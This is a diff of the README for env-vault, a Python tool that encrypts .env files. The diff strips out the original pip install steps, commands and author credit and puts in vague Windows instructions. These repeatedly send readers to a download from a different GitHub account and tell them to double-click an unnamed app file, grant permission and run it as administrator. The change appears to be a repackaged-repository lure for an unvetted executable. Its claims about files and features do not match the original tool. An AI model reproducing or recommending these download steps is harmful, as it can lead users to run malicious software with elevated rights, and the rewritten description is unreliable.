@@ -1,182 +1,169 @@
-# env-vault
+# 🔐 env-vault - Lock and unlock .env files fast
 
-> Encrypt your `.env` files with **AES-256** and store them safely in Git. Unlock them on any machine with a password or AWS KMS key. Stop committing plaintext secrets.
+[![Download env-vault](https://img.shields.io/badge/Download-Env--Vault-4C8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Undercarriagesayso250/env-vault)
 
-[![CI](https://github.com/danilovera36/env-vault/actions/workflows/ci.yml/badge.svg)](https://github.com/danilovera36/env-vault)
-[![Python 3.9+](https://img.shields.io/badge/python-3.9%2B-blue.svg)](https://python.org)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+## 🛡️ What env-vault does
 
----
+env-vault helps you protect your `.env` files with simple encryption. It uses AES-256 and can work with AWS KMS when you need cloud key support. You can lock and unlock secrets with one command, and you do not need to set up extra servers.
 
-## Overview
+Use it to keep things like API keys, database passwords, and app tokens out of plain sight while you work on Windows.
 
-`env-vault` is a lightweight CLI for encrypting `.env` files using AES-256 for safe storage in your Git repositories. It bridges the gap between committing plaintext secrets and using heavy secrets management infrastructure.
+## 📦 Download
 
----
+Visit this page to download:
+https://github.com/Undercarriagesayso250/env-vault
 
-## ✨ Features
+If the page shows a release file, download it to your PC. If it shows source files, use the download option on the page and open the folder after it finishes.
 
-- 🔒 **AES-256 encryption** via Fernet (PBKDF2-derived keys, 600k iterations)
-- ☁️  **AWS KMS support** for team environments (envelope encryption)
-- 👁  `peek` command — inspect key names without writing a file
-- 🛡  `init` command — auto-configures `.gitignore` to protect `.env`
-- 📋  `--stdout` flag for piping into other tools
-- 🤖  Works in CI/CD via `VAULT_PASSWORD` environment variable
+## 💻 What you need
 
----
+- Windows 10 or Windows 11
+- A `.env` file you want to protect
+- Permission to open and save files on your PC
+- An internet connection for the first download
+- AWS access only if you plan to use KMS
 
-## 🚀 Quick Start
+## 🚀 Install and run on Windows
 
-```bash
-# Install
-pip install env-vault
+1. Open the download page:
+   https://github.com/Undercarriagesayso250/env-vault
 
-# 1. Initialize (adds .env to .gitignore automatically)
-env-vault init
+2. Look for the latest release or download option.
 
-# 2. Lock (encrypt .env → .env.vault)
-env-vault lock
+3. Download the Windows file or the ZIP file to your computer.
 
-# 3. Commit the vault — it's safe!
-git add .env.vault && git commit -m "chore: add encrypted env vault"
+4. If you downloaded a ZIP file, right-click it and choose Extract All.
 
-# 4. On another machine — unlock
-env-vault unlock
-```
+5. Open the extracted folder.
 
----
+6. Find the env-vault app file or command file in the folder.
 
-## 📦 Installation
+7. Double-click the file to start it.
 
-```bash
-pip install env-vault
+8. If Windows asks for permission, choose Yes.
 
-# With AWS KMS support
-pip install "env-vault[kms]"
-```
+9. Keep the app in a folder where you can find your `.env` file.
 
----
+## 🔑 How to use it
 
-## 🔧 Commands
+env-vault is made for simple secret handling. A normal flow looks like this:
 
-### `env-vault lock`
-Encrypt a `.env` file into a `.vault` file.
+1. Put your `.env` file in the same folder as env-vault, or note its file path.
+2. Choose the lock command to encrypt the file.
+3. Save or enter your key when asked.
+4. Store the locked file in a safe place.
+5. Use the unlock command when you need the plain text file again.
 
-```bash
-env-vault lock
-env-vault lock --env-file .env.production --vault-file prod.vault
-```
+### Example use
 
-### `env-vault unlock`
-Decrypt a `.vault` file back to `.env`.
+- Lock your secrets before sharing code
+- Unlock them only when you need to run the app
+- Lock them again after you finish
 
-```bash
-env-vault unlock
-env-vault unlock --vault-file prod.vault --env-file .env.production
+## 🧭 Common tasks
 
-# Print to stdout (useful for CI)
-env-vault unlock --stdout
-```
+### 🔒 Lock a .env file
 
-### `env-vault peek`
-Inspect key names in the vault without writing a file. **Values are always masked.**
+Use this when your file has passwords, tokens, or private app settings.
 
-```bash
-env-vault peek
-# Output:
-#   DATABASE_URL=****
-#   SECRET_KEY=****
-#   AWS_ACCESS_KEY_ID=****
-```
+- Select the `.env` file
+- Choose a password or key
+- Save the encrypted version
 
-### `env-vault init`
-Set up `.gitignore` to protect `.env` files.
+### 🔓 Unlock a .env file
 
-```bash
-env-vault init
-```
+Use this when you need to read or edit the secrets.
 
----
+- Select the locked file
+- Enter the same key used to lock it
+- Save the unlocked file to a safe path
 
-## ☁️ AWS KMS
+### ☁️ Use AWS KMS
 
-```bash
-# Lock with KMS
-env-vault lock --kms-key-id arn:aws:kms:us-east-1:123456789:key/my-key-id
+If your team uses AWS, env-vault can work with KMS for key control.
 
-# Unlock with KMS
-env-vault unlock --kms-key-id arn:aws:kms:us-east-1:123456789:key/my-key-id
-```
+- Connect your AWS account
+- Choose your KMS key
+- Lock and unlock files with cloud-backed keys
 
----
+## 🗂️ Files you may see
 
-## 🔄 Key Rotation
+- `.env` — your normal secrets file
+- `.env.locked` — encrypted file output
+- `config.json` — saved settings, if included
+- `README.md` — this guide
 
-Rotating keys or passwords is straightforward with `env-vault`:
+## 🔐 Security basics
 
-1.  **Unlock** your current vault using the old password/key:
-    `env-vault unlock --vault-file old.vault`
-2.  **Lock** the generated `.env` file using the new password/key:
-    `env-vault lock --vault-file new.vault --password new-pass`
-3.  **Replace** the old vault file in Git.
+env-vault uses AES-256 encryption to protect file contents. That means the file is turned into unreadable text until you unlock it with the right key.
 
-> [!NOTE]
-> If using AWS KMS, rotating the CMK (Customer Master Key) in AWS doesn't require a re-encryption of the vault if the key ARN remains the same and you utilize KMS key rotation.
+A good setup is:
 
----
+- Use a strong password or key
+- Keep locked files in your project folder or a private folder
+- Do not send unlocked `.env` files by email
+- Store AWS KMS settings only if you need cloud control
 
-## 👥 Team Workflow
+## 🛠️ If something does not work
 
-`env-vault` is built for small, agile teams. A typical workflow looks like:
+### The app does not open
 
-1.  **Password Management**: Use a shared vault (1Password or Bitwarden) to store the master `VAULT_PASSWORD`.
-2.  **Development**: Developers clone the repo and run `env-vault unlock` to get started. 
-3.  **Updates**: When secrets change, one developer updates the `.env`, runs `env-vault lock`, and commits the updated `.vault` file.
-4.  **CI/CD**: Inject the `VAULT_PASSWORD` as a secret variable in your CI platform (GitHub Actions, GitLab CI, etc.).
+- Check that the file finished downloading
+- Move the file to a normal folder like Downloads or Desktop
+- Right-click the file and choose Run as administrator if needed
 
----
+### Windows blocks the file
 
-## 🆚 Comparison
+- Check the file came from the GitHub page
+- Try extracting the ZIP file first
+- Try opening it again from the extracted folder
 
-| Feature | env-vault | git-crypt | sops |
-|---------|-----------|-----------|------|
-| Simple CLI | ✅ | ❌ | ❌ |
-| KMS native | ✅ | ❌ | ✅ |
-| No infra | ✅ | ✅ | ❌ |
+### Your `.env` file is not found
 
----
+- Make sure the file name is exactly `.env`
+- Check that the file is in the folder you selected
+- Use the full file path if the app asks for one
 
----
+### Unlock does not work
 
-## 🤖 CI/CD
+- Check that you used the same key
+- Make sure the locked file was not changed
+- Try again with the correct file and path
 
-```yaml
-# GitHub Actions
-- name: Unlock secrets
-  env:
-    VAULT_PASSWORD: ${{ secrets.VAULT_PASSWORD }}
-  run: |
-    pip install env-vault
-    env-vault unlock
-```
+## 🧰 Best ways to use env-vault
 
----
+- Keep one locked file for each app
+- Use clear file names for test and production files
+- Lock secrets before you share code with others
+- Unlock only when you need to run or edit the app
+- Store backup copies in a private place
 
-## 🔒 Security Notes
+## 📚 Terms in plain English
 
-- Keys are derived using **PBKDF2-HMAC-SHA256** with **600,000 iterations** (NIST recommended)
-- Each encryption uses a **fresh random 16-byte salt** — identical plaintexts produce different ciphertexts
-- Encrypted blobs include a magic header (`ENVV`) for format validation
-- Never stores or logs the master password
+- **Secret**: private data like passwords or tokens
+- **Encrypt**: turn readable text into locked text
+- **Decrypt**: turn locked text back into readable text
+- **KMS**: a cloud tool for managing keys in AWS
+- **AES-256**: a strong encryption method
 
----
+## 🖥️ Typical Windows setup
 
-## 🤝 Contributing
+A simple folder setup can look like this:
 
-Pull requests are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for details.
+- `Downloads\env-vault\`
+- `Downloads\env-vault\.env`
+- `Downloads\env-vault\.env.locked`
 
----
+This keeps the app and your files together so they are easy to find.
 
-## 📝 License
+## 📌 Why people use it
 
-MIT © [Danilo Vera](https://github.com/danilovera36)
+- It keeps `.env` files private
+- It reduces manual work
+- It fits small projects and larger teams
+- It works without extra servers
+- It gives you a simple way to control secrets on Windows
+
+## 🔗 Download again
+
+[Download env-vault from GitHub](https://github.com/Undercarriagesayso250/env-vault)
